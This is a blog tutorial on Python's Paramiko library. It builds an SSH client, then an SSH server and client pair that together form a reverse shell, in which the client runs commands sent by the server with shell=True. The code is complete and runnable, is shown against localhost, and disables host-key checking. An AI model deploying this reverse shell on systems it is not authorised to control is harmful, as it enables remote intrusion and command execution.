# The Paramiko Module (by bt3)

**Paramiko** is awesome!!! It uses my dear [PyCrypto](https://www.dlitz.net/software/pycrypto/) to give us access to the [SSH2 protocol](http://en.wikipedia.org/wiki/SSH2), and it has a flexible and easy to use API.

You are going to see it with your own eyes: in this post we will see code for SSH clients and servers, reverse shells, and tunnel connections, and it will be smooth and fun!

Shall we start?

---

## A Simple SSH Client

The first program we are going to write is a SSH client that makes a connection to some available SSH server, and then runs a single command that we send to it.

But before we start, make sure you have  **paramiko** installed in our environment:

```sh
$ sudo pip install paramiko
```

###  Writing the SSH  Client Script
Now we are ready to create our script. We start with a **usage** function. Since **paramiko** supports authentication with both a password and/or an identity file (a key), our usage function shows how to send these arguments when we run the script (plus the port, username, and the command we want to run):

```python
def usage():
    print "Usage: ssh_client.py  <IP> -p <PORT> -u <USER> -c <COMMAND> -a <PASSWORD> -k <KEY> -c <COMMAND>"
    print "  -a                  password authentication"
    print "  -i                  identity file location"
    print "  -c                  command to be issued"
    print "  -p                  specify the port"
    print "  -u                  specify the username"
    print
    print "Examples:"
    print "ssh_client.py 129.49.76.26 -u buffy -p 22 -a killvampires  -c pwd"
    sys.exit()
```

Moving to the **main** function, we are going to use **getopt** module to parse the arguments. That's basically what the main function does: parse the arguments, sending them to the **ssh_client** function:

```python
import paramiko
import sys
import getopt

def main():
    if not len(sys.argv[1:]):
        usage()

    IP = '0.0.0.0'
    USER = ''
    PASSWORD = ''
    KEY = ''
    COMMAND = ''
    PORT = 0

    try:
        opts = getopt.getopt(sys.argv[2:],"p:u:a:i:c:", \
            ["PORT", "USER", "PASSWORD", "KEY", "COMMAND"])[0]
    except getopt.GetoptError as err:
        print str(err)
        usage()

    IP = sys.argv[1]
    print "[*] Initializing connection to " + IP

    # Handle the options and arguments
    for t in opts:
        if t[0] in ('-a'):
            PASSWORD = t[1]
        elif t[0] in ('-i'):
            KEY = t[1]
        elif t[0] in ('-c'):
            COMMAND = t[1]
        elif t[0] in ('-p'):
            PORT = int(t[1])
        elif t[0] in ('-u'):
            USER = t[1]
        else:
            print "This option does not exist!"
            usage()
    if USER:
        print "[*] User set to " + USER
    if PORT:
        print "[*] The port to be used is %d. " % PORT
    if PASSWORD:
        print "[*] A password with length %d was submitted. " %len(PASSWORD)
    if KEY:
        print "[*] The key at %s will be used." % KEY
    if COMMAND:
        print "[*] Executing the command '%s' in the host..." % COMMAND
    else:
        print "You need to specify the command to the host."
        usage()

    # start the client
    ssh_client(IP, PORT, USER, PASSWORD, KEY, COMMAND)

if __name__ == '__main__':
    main()
```

The magic happens in the **ssh_client** function, which performs the following steps:

1. Creates a paramiko ssh client object.
2. Checks if the key variable is not empty, and in this case,  loads it. If the key is not found, the program sets the policy to accept the SSH key for the SSH server (if we don't do this, an exception is raised saying that the server is not found in known_hosts).
3. Makes the connection and creates a session.
4. Checks whether this section is active and runs the command we sent.

Let's see how this works in the code:

```python
def ssh_client(ip, port, user, passwd, key, command):
    client = paramiko.SSHClient()

    if key:
        client.load_host_keys(key)
    else:
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    client.connect(ip, port=port, username=user, password=passwd)
    ssh_session = client.get_transport().open_session()

    if ssh_session.active:
        ssh_session.exec_command(command)
        print
        print ssh_session.recv(4096)
```

Easy, huh?

### Running the Script

We are ready to run our script. If we use the example in the usage function (and supposing the account exists in that host), we will see the following:

```sh
$ ssh_client.py 129.49.76.26 -u buffy -p 22 -a killvampires  -c pwd
[*] Initializing connection to 129.49.76.26
[*] User set to buffy
[*] The port to be used is 22.
[*] A password with length 12 was submitted.
[*] Executing the command 'pwd' in the host...

/home/buffy.
```

-----

## A SSH Server to Reverse a Client Shell

What if we also control the SSH server and we are able to send commands to our SSH client? This is exactly what we are going to do now: we are going to write a **class** for this server (with a little help of the **socket** module) and then we will be able to **reverse the shell**!


As a note, this script is based in some of the [paramiko demos](https://github.com/paramiko/paramiko/blob/master/demo) and we specifically use the key from their demo files ([download here](https://github.com/paramiko/paramiko/blob/master/demos/test_rsa.key)).


### The SSH Server

In our server script, we first  create a class **Server** that issues a new thread event, checking whether the session is valid, and performing authentication. Notice that for simplicity we are hard-coding the values for username, password and host key, which is never a good practice:

```python
HOST_KEY = paramiko.RSAKey(filename='test_rsa.key')
USERNAME = 'buffy'
PASSWORD = 'killvampires'

class Server(paramiko.ServerInterface):
    def __init__(self):
        self.event = threading.Event()
    def check_channel_request(self, kind, chanid):
        if kind == 'session':
            return paramiko.OPEN_SUCCEEDED
        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED
    def check_auth_password(self, username, password):
        if (username == USERNAME) and (password == PASSWORD):
            return paramiko.AUTH_SUCCESSFUL
        return paramiko.AUTH_FAILED
```

Now, let's take a look at the **main** function, which does the following:

1. Creates a socket object to bind the host and port, so it can listen for incoming connections.
2. Once a connection is established (the client tried to connect to the server and the socket accepted the connection), it creates a **paramiko** Transport object for this socket (in paramiko there are two main communication methods: *transport*, which makes and maintains the encrypted connection, and *channel*, which is like a sock for sending/receiving data over the encrypted session).-
3. The program instantiates a **Server** object and starts the paramiko session with it.
4. Authentication is attempted. If it is successful, we get a **ClientConnected** message.
5. The server starts a loop where it will keep getting  input commands from the user and issuing it in the client. This is our reversed  shell!

```python
import paramiko
import getopt
import threading
import sys
import socket

def main():
    if not len(sys.argv[1:]):
        print "Usage: ssh_server.py <SERVER>  <PORT>"
        sys.exit(0)

    # creating a socket object
    server = sys.argv[1]
    ssh_port = int(sys.argv[2])
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind((server, ssh_port))
        sock.listen(100)
        print "[+] Listening for connection ..."
        client, addr = sock.accept()
    except Exception, e:
        print "[-] Connection Failed: " + str(e)
        sys.exit(1)
    print "[+] Connection Established!"

    # creating a paramiko object
    try:
        Session = paramiko.Transport(client)
        Session.add_server_key(HOST_KEY)
        paramiko.util.log_to_file("filename.log")
        server = Server()
        try:
            Session.start_server(server=server)
        except paramiko.SSHException, x:
            print '[-] SSH negotiation failed.'
        chan = Session.accept(10)
        print '[+] Authenticated!'
        chan.send("Welcome to Buffy's SSH")
        while 1:
            try:
                command = raw_input("Enter command: ").strip('\n')
                if command != 'exit':
                    chan.send(command)
                    print chan.recv(1024) + '\n'
                else:
                    chan.send('exit')
                    print '[*] Exiting ...'
                    session.close()
                    raise Exception('exit')
            except KeyboardInterrupt:
                session.close()

    except Exception, e:
        print "[-] Caught exception: " + str(e)
        try:
            session.close()
        except:
            pass
        sys.exit(1)

if __name__ == '__main__':
    main()
```



### The SSH Client

The last piece for our reversed shell is to make the SSH client to be able to receive commands from the server.

We are going to adapt the previous client script to receive these commands. All we need to do is to add a loop inside the session:

```python
import paramiko
import sys
import getopt
import subprocess

def usage():
    print "Usage: ssh_client.py  <IP> -p <PORT> -u <USER> -c <COMMAND> -a <PASSWORD>"
    print "  -a                  password authentication"
    print "  -p                  specify the port"
    print "  -u                  specify the username"
    print
    print "Examples:"
    print "ssh_client.py localhost -u buffy -p 22 -a killvampires"
    sys.exit()

def ssh_client(ip, port, user, passwd):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(ip, port=port, username=user, password=passwd)
    ssh_session = client.get_transport().open_session()
    if ssh_session.active:
        print ssh_session.recv(1024)
        while 1:
            command = ssh_session.recv(1024)
            try:
                cmd_output = subprocess.check_output(command, shell=True)
                ssh_session.send(cmd_output)
            except Exception, e:
                ssh_session.send(str(e))
        client.close()

def main():
    if not len(sys.argv[1:]):
        usage()
    IP = '0.0.0.0'
    USER = ''
    PASSWORD = ''
    PORT = 0
    try:
        opts = getopt.getopt(sys.argv[2:],"p:u:a:", \
            ["PORT", "USER", "PASSWORD"])[0]
    except getopt.GetoptError as err:
        print str(err)
        usage()
    IP = sys.argv[1]
    print "[*] Initializing connection to " + IP
    for t in opts:
        if t[0] in ('-a'):
            PASSWORD = t[1]
        elif t[0] in ('-p'):
            PORT = int(t[1])
        elif t[0] in ('-u'):
            USER = t[1]
        else:
            print "This option does not exist!"
            usage()
    if USER:
        print "[*] User set to " + USER
    if PORT:
        print "[*] The port to be used is %d. " % PORT
    if PASSWORD:
        print "[*] A password with length %d was submitted. " %len(PASSWORD)
    ssh_client(IP, PORT, USER, PASSWORD)

if __name__ == '__main__':
    main()
```

### Running both Scripts
Let's run each script in a different terminal. First, the server:
```bash
$ ssh_server.py localhost 22
[+] Listening for connection ...
```

Then the client:
```sh
$ ssh_client_reverse.py localhost -p 22 -u buffy -a killvampires
[*] Initializing connection to localhost
[*] User set to buffy
[*] The port to be used is 22.
[*] A password with length 12 was submitted.
Welcome to Buffy's SSH
```

Now we can send any command from the server side to run  in the client: we have a reversed shell!

```sh
[+] Listening for connection ...
[+] Connection Established!
[+] Authenticated!
Enter command: ls
filename.log
ssh_client.py
ssh_client_reverse.py
ssh_server.py
test_rsa.key

Enter command:
```

**Awesomesauce!**

 Ah, by the way, all these scripts work not only in Linux but in Windows and Mac as well (so next time you are in a lame Windows machine, no need to install [Putty](http://www.chiark.greenend.org.uk/~sgtatham/putty/download.html) anymore =p ).

---

## Further References:

- [Paramikos reverse SSH tunneling](https://github.com/paramiko/paramiko/blob/master/demos/rforward.py).
- [Black Hat Python](http://www.nostarch.com/blackhatpython).
- [My Gray hat repo](https://github.com/go-outside-labs/My-Gray-Hacker-Resources).
